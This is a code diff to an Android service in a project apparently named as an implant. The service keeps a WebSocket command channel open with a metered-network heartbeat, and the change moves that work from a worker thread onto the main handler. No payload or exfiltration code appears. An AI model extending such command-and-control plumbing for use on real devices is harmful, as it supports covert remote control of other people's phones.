@@ -5,7 +5,6 @@ import android.content.Context
 import android.content.Intent
 import android.os.Build
 import android.os.Handler
-import android.os.HandlerThread
 import android.os.IBinder
 import android.util.Log
 import com.cooperthecoder.implant.App
@@ -33,17 +32,12 @@ class CommandService : Service() {
     private var webSocket: WebSocket? = null
     val commandListener = CommandListener(this)
 
-    lateinit var connectionHandler: Handler
     lateinit var mainHandler: Handler
-
-    val meteredNetworkTask = Runnable {
-        this@CommandService.onMeteredConnection()
-    }
 
     val checkMeteredTask: Runnable = Runnable {
         if (Networking.isMeteredNetwork(this@CommandService)) {
             Log.d(TAG, "Metered network detected.")
-            mainHandler.post(meteredNetworkTask)
+            this@CommandService.onMeteredConnection()
 
         }
 
@@ -77,26 +71,18 @@ class CommandService : Service() {
                 .build()
 
         webSocket = (application as App).httpClient.newWebSocket(request, commandListener)
-        val connectivityThread = HandlerThread(WORKER_THREAD_NAME)
-        connectivityThread.start()
-        connectionHandler = Handler(connectivityThread.looper)
-        mainHandler = Handler(mainLooper)
+        mainHandler = Handler()
         heartbeat()
 
     }
 
     private fun heartbeat() {
-        connectionHandler.postDelayed(checkMeteredTask, HEARTBEAT_INTERVAL)
+        mainHandler.postDelayed(checkMeteredTask, HEARTBEAT_INTERVAL)
     }
 
 
     private fun closeCommandChannel() {
         webSocket?.close(SOCKET_CLOSE, null)
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR2) {
-            connectionHandler.looper.quitSafely()
-        } else {
-            connectionHandler.looper.quit()
-        }
     }
 
     private fun onMeteredConnection() {
